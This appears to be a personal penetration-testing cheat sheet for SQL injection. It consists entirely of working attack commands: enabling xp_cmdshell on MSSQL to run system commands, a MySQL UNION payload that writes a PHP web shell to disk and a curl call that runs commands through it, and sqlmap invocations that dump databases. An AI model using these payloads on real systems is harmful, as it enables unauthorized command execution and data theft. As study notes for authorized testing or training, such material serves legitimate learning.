# SQLi

## MSSQL 

```
impacket-mssqlclient account:passwd@ip -windows-auth

SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
```

## MySQL

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, ..., null INTO OUTFILE "/path/webshell.php" -- //

curl ip/path/webshell.php?cmd=ls
```

## sqlmap

```
sqlmap -u http://ip/page.php?user=dummy -p user
sqlmap -u http://ip/page.php?user=dummy -p user --dump
```


